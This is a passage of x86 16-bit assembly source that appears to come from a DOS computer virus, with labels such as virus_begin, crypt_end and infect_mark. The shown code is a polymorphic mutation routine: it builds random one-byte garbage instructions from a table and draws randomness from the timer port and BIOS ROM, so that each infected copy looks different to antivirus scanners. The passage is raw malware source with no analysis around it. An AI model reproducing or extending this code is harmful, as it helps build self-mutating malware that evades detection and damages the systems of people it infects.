   gen_garbag_  proc    near        ; Generate garbage
            xchg    di,dx       ; DX = offset within segment of al...
   gen_garbag__:
            call    get_rnd_num

            mov     ax,0fh      ; Random number within fifteen
            call    rnd_in_range

            or      di,di       ; Don't generate any garbage inst...?
            jz      gen_garbag__    ; Zero? Jump to gen_garbag__

            mov     cx,di       ; CX = number of one byte garbage ...
            mov     ds:[(mov_r16_off-virus_begin)],cx
   gen_garba_:
            call    get_rnd_num

            mov     ax,(one_byte_end-one_by_begin)
            call    rnd_in_range

            lea     si,[di+(one_by_table-virus_begin)]
            lodsb           ; INC reg16/DEC reg16/NOP/CLD/CBW/...

            cmp     al,ds:[(inc_reg16-virus_begin)]
            je      gen_garba_      ; Equal? Jump to gen_garba_
            cmp     al,ds:[(dec_reg16-virus_begin)]
            je      gen_garba_      ; Equal? Jump to gen_garba_

            mov     di,dx       ; DI = offset within segment of al...
            cld             ; Clear direction flag
            stosb           ; Store INC reg16/DEC reg16/NOP/CL...

            mov     dx,di       ; DX = offset within segment of al...

            loop    gen_garba_

            ret             ; Return!
            endp

   rnd_in_range proc    near        ; Random number within range
            push    ax bx cx dx     ; Save registers at stack

            xchg    dx,bx       ; DX = 16-bit random number
            xor     bx,bx       ; Zero BX

            mov     cx,0ffffh       ; Compare 8-bit random number with...
   rnd_in_loop:
            mov     bh,ah       ; BH = random number within range
   cmp_rnd_num:
            call    cmp_rnd_num_

            inc     bh          ; Increase random number within range
            cmp     bh,al       ; Compare random number within ran...
            jne     cmp_rnd_num     ; Not equal? Jump to cmp_rnd_num

            loop    rnd_in_loop

            ret             ; Return!
   rnd_in_exit:
            xor     bl,bl       ; Zero BL
            xchg    bh,bl       ; BX = random number within range
            mov     di,bx       ; DI =   "      "      "      "

            pop     dx cx bx ax     ; Load registers from stack

            cld             ; Clear direction flag

            ret             ; Return!
            endp

   cmp_rnd_num_ proc    near        ; Compare 8-bit random number with...
            inc     bl          ; Increase low-order byte of base ...

            cmp     bl,dl       ; Compare 8-bit random number wit...?
            je      rnd_in_exit_    ; Equal? Jump to rnd_in_exit_

            ret             ; Return!
   rnd_in_exit_:
            pop     cx          ; Load CX from stack

            jmp     rnd_in_exit
            endp
            endp

   get_rnd_num  proc    near
            push    ax dx es di cx  ; Save registers at stack

            in      ax,40h      ; AX = 16-bit random number
            xchg    ax,dx       ; DX =   "      "      "

            inc     byte ptr ds:[(random_count-virus_begin)]

            mov     ax,0f800h       ; AX = segment within system BIOS/ROM
            mov     es,ax       ; ES =    "      "      "       "

            mov     di,ds:[(random_off-virus_begin)]
            xor     dx,es:[di]      ; DX = 16-bit random number
            mov     ds:[(random_off-virus_begin+200h)],dx

            mov     cl,ds:[(random_count-virus_begin+200h)]
            rol     dx,cl       ; DX = 16-bit random number
            mov     bx,dx       ; BX =   "      "      "

            pop     cx di es dx ax  ; Load registers from stack

            cld             ; Clear direction flag

            ret             ; Return!
            endp
            endp
   crypt_end:
   infect_mark  dw      ?           ; Infection mark
   infect_mark_ db      ''                ;     "      "
   code_end:

   end      code_begin
